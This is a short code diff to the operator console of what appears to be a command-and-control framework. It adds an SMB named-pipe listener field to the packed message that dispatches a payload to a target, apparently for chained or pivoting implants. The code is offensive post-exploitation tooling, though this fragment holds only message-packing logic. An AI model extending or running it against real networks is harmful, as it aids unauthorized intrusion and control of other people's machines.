@@ -787,12 +787,31 @@ class OperatorShell:
             # Flags byte: bit 0 = server-connection
             flags = 0x01 if server_connection else 0x00
 
-            # Pack wire format: [1B method][1B flags][4B target_len][target][4B payload_len][payload]
+            # Build listener info string for --server-connection mode
+            # For chained mode this is ignored (child uses PIPE:<name>)
+            listener_info = ""
+            listener_type = found_listener.info().get("type", "").upper()
+            if server_connection and listener_type == "SMB":
+                # Pass pipe name; child extracts C2 host from its own baked-in config
+                smb_pipe = getattr(found_listener, "pipe_name", "")
+                if smb_pipe:
+                    listener_info = f"C2SMB:{smb_pipe}"
+                else:
+                    console.print("[red]SMB listener has no pipe name configured.[/red]")
+                    return
+
+            # Pack wire format:
+            #   [1B method][1B flags][4B target_len][target\0]
+            #   [4B listener_info_len][listener_info\0]
+            #   [4B payload_len][payload]
             import struct
             target_bytes = target.encode("utf-8") + b"\x00"
+            info_bytes = listener_info.encode("utf-8") + b"\x00" if listener_info else b"\x00"
             packed = struct.pack("<BB", method_id, flags)
             packed += struct.pack("<I", len(target_bytes))
             packed += target_bytes
+            packed += struct.pack("<I", len(info_bytes))
+            packed += info_bytes
             packed += struct.pack("<I", len(payload))
             packed += payload
 
